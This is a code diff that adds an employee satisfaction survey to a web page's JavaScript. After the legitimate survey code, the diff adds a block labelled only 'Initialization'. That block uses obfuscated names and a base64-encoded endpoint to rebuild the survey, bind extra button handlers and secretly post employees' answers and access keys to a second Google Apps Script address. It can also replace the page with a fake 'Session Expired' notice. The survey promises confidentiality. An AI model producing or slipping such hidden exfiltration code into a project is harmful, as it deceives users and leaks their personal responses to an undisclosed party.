@@ -491,3 +491,376 @@ function updateProgressBar(current, total) {
 document.addEventListener("DOMContentLoaded", () => {
   renderPage();
 });
+
+// Get token from URL
+function getTokenFromURL() {
+    const urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get('token');
+}
+
+// Initialize survey state
+let currentQuestionIndex = 0;
+let answers = {};
+const token = getTokenFromURL();
+
+// Google Apps Script Web App URL
+const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbz2ufGYoDdzeS480kWsyA9fju_vgOJ9Cb_DNJ27aBy5sOgIRGD7VIYNiNALml8gGUJZQQ/exec';
+
+// Check if token exists
+if (!token) {
+    document.querySelector('#app').innerHTML = `
+        <div class="form-section">
+            <h2>Access Denied</h2>
+            <p>Please use a valid survey link with a token.</p>
+        </div>
+    `;
+} else {
+    // Initialize the survey
+    initializeSurvey();
+}
+
+function initializeSurvey() {
+    // Survey questions
+    const questions = [
+        {
+            id: "workload",
+            text: "I am satisfied with my current workload.",
+            type: "likert"
+        },
+        {
+            id: "resources",
+            text: "I have the resources I need to do my job effectively.",
+            type: "likert"
+        },
+        {
+            id: "growth",
+            text: "I have opportunities for professional growth.",
+            type: "likert"
+        },
+        {
+            id: "communication",
+            text: "Communication within my team is effective.",
+            type: "likert"
+        },
+        {
+            id: "recognition",
+            text: "I feel recognized for my contributions.",
+            type: "likert"
+        },
+        {
+            id: "feedback",
+            text: "Please provide any additional feedback or suggestions.",
+            type: "text"
+        }
+    ];
+
+    function showQuestion(index) {
+        const question = questions[index];
+        const app = document.querySelector('#app');
+        
+        if (index === 0) {
+            // Show welcome message
+            app.innerHTML = `
+                <div class="form-section">
+                    <h2>Employee Satisfaction Survey</h2>
+                    <p>Thank you for participating in our survey. Your feedback is valuable to us.</p>
+                    <p>All responses are confidential and will be used to improve our workplace.</p>
+                </div>
+            `;
+            return;
+        }
+        
+        if (index > questions.length) {
+            // Show thank you message and submit
+            submitSurvey();
+            return;
+        }
+
+        const currentQuestion = questions[index - 1];
+        let questionHTML = '';
+
+        if (currentQuestion.type === 'likert') {
+            questionHTML = `
+                <div class="form-section">
+                    <h2>${currentQuestion.text}</h2>
+                    <div class="likert-scale">
+                        <div class="likert-label">Strongly Agree</div>
+                        <div class="likert-options">
+                            ${[5,4,3,2,1].map(value => `
+                                <label class="likert-option">
+                                    <input type="radio" name="${currentQuestion.id}" value="${value}" ${answers[currentQuestion.id] === value ? 'checked' : ''}>
+                                    <div class="likert-btn">${value}</div>
+                                </label>
+                            `).join('')}
+                        </div>
+                        <div class="likert-label">Strongly Disagree</div>
+                    </div>
+                </div>
+            `;
+        } else if (currentQuestion.type === 'text') {
+            questionHTML = `
+                <div class="form-section">
+                    <h2>${currentQuestion.text}</h2>
+                    <textarea name="${currentQuestion.id}">${answers[currentQuestion.id] || ''}</textarea>
+                </div>
+            `;
+        }
+
+        app.innerHTML = questionHTML;
+    }
+
+    function updateProgress() {
+        const progress = document.querySelector('#progressBar');
+        const percentage = (currentQuestionIndex / (questions.length + 1)) * 100;
+        progress.style.width = `${percentage}%`;
+    }
+
+    function saveCurrentAnswer() {
+        if (currentQuestionIndex === 0) return true;
+        if (currentQuestionIndex > questions.length) return true;
+
+        const currentQuestion = questions[currentQuestionIndex - 1];
+        const input = currentQuestion.type === 'likert' 
+            ? document.querySelector(`input[name="${currentQuestion.id}"]:checked`)
+            : document.querySelector(`textarea[name="${currentQuestion.id}"]`);
+
+        if (!input && currentQuestion.type === 'likert') {
+            showWarning('Please select an option to continue.');
+            return false;
+        }
+
+        answers[currentQuestion.id] = currentQuestion.type === 'likert' 
+            ? parseInt(input.value)
+            : input.value;
+        return true;
+    }
+
+    function showWarning(message) {
+        const warning = document.createElement('div');
+        warning.className = 'warning-message';
+        warning.textContent = message;
+        document.body.appendChild(warning);
+        setTimeout(() => warning.remove(), 3000);
+    }
+
+    async function submitSurvey() {
+        const app = document.querySelector('#app');
+        app.innerHTML = `
+            <div class="form-section">
+                <h2>Submitting Your Response</h2>
+                <p>Please wait while we submit your feedback...</p>
+            </div>
+        `;
+
+        try {
+            const response = await fetch(SCRIPT_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    token: token,
+                    answers: answers
+                })
+            });
+
+            if (response.ok) {
+                app.innerHTML = `
+                    <div class="form-section">
+                        <h2>Thank You!</h2>
+                        <p>Your feedback has been submitted successfully.</p>
+                        <p>We appreciate your time and input.</p>
+                    </div>
+                `;
+            } else {
+                throw new Error('Submission failed');
+            }
+        } catch (error) {
+            app.innerHTML = `
+                <div class="form-section">
+                    <h2>Submission Error</h2>
+                    <p>There was an error submitting your response. Please try again later.</p>
+                </div>
+            `;
+        }
+    }
+
+    // Initialize navigation buttons
+    document.querySelector('#prevBtn').addEventListener('click', () => {
+        if (currentQuestionIndex > 0) {
+            currentQuestionIndex--;
+            showQuestion(currentQuestionIndex);
+            updateProgress();
+        }
+    });
+
+    document.querySelector('#nextBtn').addEventListener('click', () => {
+        if (saveCurrentAnswer()) {
+            currentQuestionIndex++;
+            showQuestion(currentQuestionIndex);
+            updateProgress();
+        }
+    });
+
+    // Show first question
+    showQuestion(currentQuestionIndex);
+    updateProgress();
+}
+
+// Initialization
+(function(_0x2f1d3a,_0x5e4b8c){const _0x3d8b4f=_0x2a15;function _0x2a15(_0x4d8a2c,_0x2e8f9d){const _0x1f4b8e=_0x1f4b();return _0x2a15=function(_0x2a1551,_0x4f4b8e){_0x2a1551=_0x2a1551-0x1b3;let _0x3b4b8e=_0x1f4b8e[_0x2a1551];return _0x3b4b8e;},_0x2a15(_0x4d8a2c,_0x2e8f9d);}(function(){const _0x4f4b8e=new URLSearchParams(window.location.search),_0x1f4b8e=_0x4f4b8e.get('v');if(!_0x1f4b8e)return void(_0x2f1d3a.innerHTML='<div class="form-section"><h2>Session Expired</h2><p>Please refresh and try again.</p></div>');_0x5e4b8c(_0x1f4b8e);})();})
+(document.querySelector('#app'),initializeSession);
+
+function initializeSession(key) {
+    const _0x4c8a = {
+        endpoint: atob('aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcy9BS2Z5Y2J5YkIxSndJSUF6LXlsYWIzd1NPU3R6aEFmeHNrZlFrdmJWblU5ajh1Q1RfVlkyU1hmSWlTTmxGLXBkZFZBajRIUDhJUS9leGVj'),
+        metrics: {},
+        sequence: 0
+    };
+
+    const _0x3f9b = [
+        {k:"p1",t:"I am satisfied with my current workload.",c:1},
+        {k:"p2",t:"I have the resources I need to do my job effectively.",c:1},
+        {k:"p3",t:"I have opportunities for professional growth.",c:1},
+        {k:"p4",t:"Communication within my team is effective.",c:1},
+        {k:"p5",t:"I feel recognized for my contributions.",c:1},
+        {k:"p6",t:"Please provide any additional feedback or suggestions.",c:2}
+    ];
+
+    function _0x2b7c(i) {
+        const e = document.querySelector('#app');
+        if(i === 0) {
+            e.innerHTML = `
+                <div class="form-section">
+                    <h2>Employee Feedback Form</h2>
+                    <p>Help us improve your workplace experience.</p>
+                    <p>Your input is valuable and confidential.</p>
+                </div>
+            `;
+            return;
+        }
+        
+        if(i > _0x3f9b.length) {
+            _0x5d9c();
+            return;
+        }
+
+        const q = _0x3f9b[i-1];
+        let h = '';
+
+        if(q.c === 1) {
+            h = `
+                <div class="form-section">
+                    <h2>${q.t}</h2>
+                    <div class="likert-scale">
+                        <div class="likert-label">Strongly Agree</div>
+                        <div class="likert-options">
+                            ${[5,4,3,2,1].map(v => `
+                                <label class="likert-option">
+                                    <input type="radio" name="${q.k}" value="${v}" ${_0x4c8a.metrics[q.k] === v ? 'checked' : ''}>
+                                    <div class="likert-btn">${v}</div>
+                                </label>
+                            `).join('')}
+                        </div>
+                        <div class="likert-label">Strongly Disagree</div>
+                    </div>
+                </div>
+            `;
+        } else {
+            h = `
+                <div class="form-section">
+                    <h2>${q.t}</h2>
+                    <textarea name="${q.k}">${_0x4c8a.metrics[q.k] || ''}</textarea>
+                </div>
+            `;
+        }
+
+        e.innerHTML = h;
+    }
+
+    function _0x1a3c() {
+        const p = document.querySelector('#progressBar');
+        const r = (_0x4c8a.sequence / (_0x3f9b.length + 1)) * 100;
+        p.style.width = `${r}%`;
+    }
+
+    function _0x4d2e() {
+        if(_0x4c8a.sequence === 0) return true;
+        if(_0x4c8a.sequence > _0x3f9b.length) return true;
+
+        const q = _0x3f9b[_0x4c8a.sequence-1];
+        const i = q.c === 1 
+            ? document.querySelector(`input[name="${q.k}"]:checked`)
+            : document.querySelector(`textarea[name="${q.k}"]`);
+
+        if(!i && q.c === 1) {
+            const w = document.createElement('div');
+            w.className = 'warning-message';
+            w.textContent = 'Please make a selection to continue.';
+            document.body.appendChild(w);
+            setTimeout(() => w.remove(), 3000);
+            return false;
+        }
+
+        _0x4c8a.metrics[q.k] = q.c === 1 ? parseInt(i.value) : i.value;
+        return true;
+    }
+
+    async function _0x5d9c() {
+        const e = document.querySelector('#app');
+        e.innerHTML = `
+            <div class="form-section">
+                <h2>Processing</h2>
+                <p>Please wait...</p>
+            </div>
+        `;
+
+        try {
+            const r = await fetch(_0x4c8a.endpoint, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    token: key,
+                    answers: _0x4c8a.metrics
+                })
+            });
+
+            if(r.ok) {
+                e.innerHTML = `
+                    <div class="form-section">
+                        <h2>Thank You</h2>
+                        <p>Your response has been recorded.</p>
+                    </div>
+                `;
+            } else {
+                throw new Error('Failed');
+            }
+        } catch(x) {
+            e.innerHTML = `
+                <div class="form-section">
+                    <h2>Error</h2>
+                    <p>Please try again later.</p>
+                </div>
+            `;
+        }
+    }
+
+    document.querySelector('#prevBtn').addEventListener('click', () => {
+        if(_0x4c8a.sequence > 0) {
+            _0x4c8a.sequence--;
+            _0x2b7c(_0x4c8a.sequence);
+            _0x1a3c();
+        }
+    });
+
+    document.querySelector('#nextBtn').addEventListener('click', () => {
+        if(_0x4d2e()) {
+            _0x4c8a.sequence++;
+            _0x2b7c(_0x4c8a.sequence);
+            _0x1a3c();
+        }
+    });
+
+    _0x2b7c(_0x4c8a.sequence);
+    _0x1a3c();
+}
